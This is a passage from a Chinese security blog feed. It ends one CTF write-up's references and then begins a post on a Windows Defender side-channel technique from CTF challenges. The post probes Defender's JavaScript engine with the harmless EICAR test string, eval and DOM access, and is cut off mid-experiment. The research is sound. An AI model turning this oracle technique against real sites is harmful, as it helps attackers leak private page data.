K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191003191545.jpg" alt=""></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster" target="_blank" rel="noopener">Insomnihack Teaser 2019 / l33t-hoster</a></p><p>[l33t-hoster]([<a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md]" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md]</a>(<a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack" target="_blank" rel="noopener">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack</a> 2019/l33t-hoster/l33t-hoster.md))</p><p><a href="https://xz.aliyun.com/t/6111" target="_blank" rel="noopener">XNUCA2019 ez系列web题解</a></p><p><a href="https://xz.aliyun.com/t/6101" target="_blank" rel="noopener">X-NUCA 2019 线上赛 Writeup By ROIS</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows Defender 侧信道攻击</title>
    <link href="https://blog.zeddyu.info/2019/09/17/windows-defender/"/>
    <id>https://blog.zeddyu.info/2019/09/17/windows-defender/</id>
    <published>2019-09-17T22:22:10.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>在今年的 WCTF 2019 上，Tokyo Westerns 出了一道与 Windows Defender 侧信道攻击相关的题目，在 Tokyo Westerns CTF 2019 上也有一道与之有关的题目 PHP Note，看了感觉比较有趣，但是我看的网络文章写的都比较粗略，这里我就记录一下自己的分析。</p><a id="more"></a><h2 id="Windows-Defender"><a href="#Windows-Defender" class="headerlink" title="Windows Defender"></a>Windows Defender</h2><p>众所周知，Windows Defender 是 Windows 10 平台上一款自带的安全防护软件，<del>游戏弹窗杀手</del></p><blockquote class="colorquote info"><p>Windows Defender（Windows 10 创意者更新后名为Windows Defender Antivirus），曾用名Microsoft AntiSpyware，最初是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。Windows Defender的定义库更新很频繁。在Windows 8及之后的系统中取代Microsoft Security Essentials，成为一款全面反病毒软件。</p><p>Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。</p></blockquote><h2 id="What-Windows-Defender-will-do"><a href="#What-Windows-Defender-will-do" class="headerlink" title="What Windows Defender will do"></a>What Windows Defender will do</h2><p>根据 TW 的分析，Windows Defender 会有以下行为：</p><ol><li>检查文件内容是否有恶意内容</li><li>改变恶意文件的权限以避免用户去加载</li><li>替换恶意内容为空</li><li>删除整个文件</li></ol><p>在第二步中，如果文件被 Windows Defender 检测出是恶意文件的话，用户就不可以访问了。</p><h2 id="Make-Windows-Defender-Angry"><a href="#Make-Windows-Defender-Angry" class="headerlink" title="Make Windows Defender Angry"></a>Make Windows Defender Angry</h2><h3 id="EICAR"><a href="#EICAR" class="headerlink" title="EICAR"></a>EICAR</h3><blockquote class="colorquote info"><p>EICAR标准反病毒测试文件，又称EICAR测试文件, 是由欧洲反计算机病毒协会（EICAR）与计算机病毒研究组织（CARO）研制的文件, 用以测试杀毒软件的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。</p></blockquote><p>我们可以使用以下字符串测试 Windows Defender</p><p></p><figure class="highlight stata hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X5O!P%@<span class="hljs-keyword">AP</span>[4\PZX54(P^)7CC)7}<span class="hljs-variable">$EICAR</span>-STANDARD-ANTIVIRUS-<span class="hljs-keyword">TEST</span>-<span class="hljs-keyword">FILE</span>!<span class="hljs-variable">$H</span>+<span class="hljs-keyword">H</span>*</span><br></pre></td></tr></tbody></table></figure><p></p><p>只需要将这个字符串复制，然后保存在一个空白的 txt 文件当中即可触发 Windwos Defender，所以我们先通过这个样例来检查一下自己的 Windows Defender 是否开启。</p><h3 id="Mpengine-dll"><a href="#Mpengine-dll" class="headerlink" title="Mpengine.dll"></a>Mpengine.dll</h3><p>根据 Tokyo Westerns 的分析，Windows Defender 有一个核心 dll 文件 Mpengine.dll ，他可以对不同的内容进行分析，包括一些 base64 encode/RAR archived/etc. ，其中比较有意思的是它还有一个 Javascript Engine。</p><p>这个引擎可以分析 HTML 文档，并且可以分析其中的 Javascript 代码，包括对文档中的 DOM 元素的访问。</p><p>我们可以做个简单的验证，我们先只使用以下代码测试：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190911181803.png" alt=""></p><p>可以发现我们并没有触发 Windows Defender，即使字符串是 EICAR 测试样本，说明了字符串不受 EICAR 特征影响。</p><p>接着我们尝试添加一下<code>eval</code>：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>;</span><br><span class="line"><span class="hljs-built_in">eval</span>(mal);</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190911181841.png" alt=""></p><p>没错，在保存的时候就立马触发了 Windows Defender ，足以验证当中有一个 Javascript Engine 进行了内容检测，而且即使没有完整的 Javascript 标签，也可以触发 Windows defender。</p><h3 id="Interesting-Check"><a href="#Interesting-Check" class="headerlink" title="Interesting Check"></a>Interesting Check</h3><p>接下来我们再看几个测试例子：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100623.png" alt=""></p><p>非常棒，并没有被检测出恶意内容。</p><p>接着我们再试着加一个<code>&lt;body&gt;</code>标签:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100640.png" alt=""></p><p>也很棒，也没有检测出恶意内容。</p><p>让我们再操作一下 DOM 元素：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fI